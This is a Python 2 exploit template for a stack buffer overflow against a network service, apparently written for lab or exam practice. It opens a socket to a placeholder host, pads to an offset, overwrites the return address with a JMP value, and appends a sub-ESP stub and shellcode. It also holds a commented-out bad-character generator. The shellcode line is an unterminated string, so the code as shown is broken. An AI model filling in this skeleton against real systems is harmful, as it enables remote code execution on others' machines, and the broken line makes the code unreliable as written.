#!/usr/bin/env python2

import socket
import struct

RHOST = "<IP>"
RPORT = <PORT>
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#Badcharacter test
##badchartest = ""
#badchars = [0x00, 0x0A] #00 is always a bad character!

#for i in range(0x00, 0xFF+1):
#	if i not in badchars:
#		badchartest += chr(i)

#with open ("badcharbin8.bin", "wb") as f:
#    f.write(badchartest)

off_total = <total_byte_offset>
offset = <byte_offset>
jmp = <JMP>

shellcode =  b""
shellcode += b"

subesp = ""

payload2 = ""
payload2 += "A"*(offset - len(payload2))
payload2 += struct.pack("<I", jmp) #JMP here
payload2 += subesp
payload2 += shellcode
#payload2 += "\xCC\xCC\xCC\xCC"
#payload2 += subesp
#payload2 += badchartest
#payload2 += shellcode
#payload2 += "BBBB"
#payload2 += badchartest
#payload2 += "CCCC"
payload2 += "D"*(off_total - len(payload2))
payload2 += "\n"
s.send(payload2)

print "Sent {0}".format(payload2)
print str(s.recv(1024))
